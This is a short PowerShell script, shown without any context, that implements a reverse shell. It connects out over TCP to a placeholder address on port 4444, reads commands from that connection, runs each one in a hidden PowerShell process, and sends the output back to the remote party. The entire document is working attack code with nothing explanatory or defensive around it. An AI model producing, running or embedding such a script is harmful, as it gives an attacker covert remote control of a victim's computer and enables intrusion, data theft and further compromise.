$ip = '0.0.0.0'
$port = 4444
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($ip, $port)

$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter $stream
$reader = New-Object System.IO.StreamReader $stream

while ($true) {
    $command = $reader.ReadLine()
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = 'powershell.exe'
    $process.StartInfo.Arguments = '-NoProfile -NonInteractive -Command -'
    $process.StartInfo.RedirectStandardInput = $true
    $process.StartInfo.RedirectStandardOutput = $true
    $process.StartInfo.UseShellExecute = $false
    $process.StartInfo.CreateNoWindow = $true
    $process.Start()
    $inputStream = $process.StandardInput
    $outputStream = $process.StandardOutput
    $inputStream.WriteLine($command)
    $inputStream.Close()
    $output = $outputStream.ReadToEnd()
    $outputBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
    $stream.Write($outputBytes, 0, $outputBytes.Length)
    $stream.Flush()
    $process.WaitForExit()
}
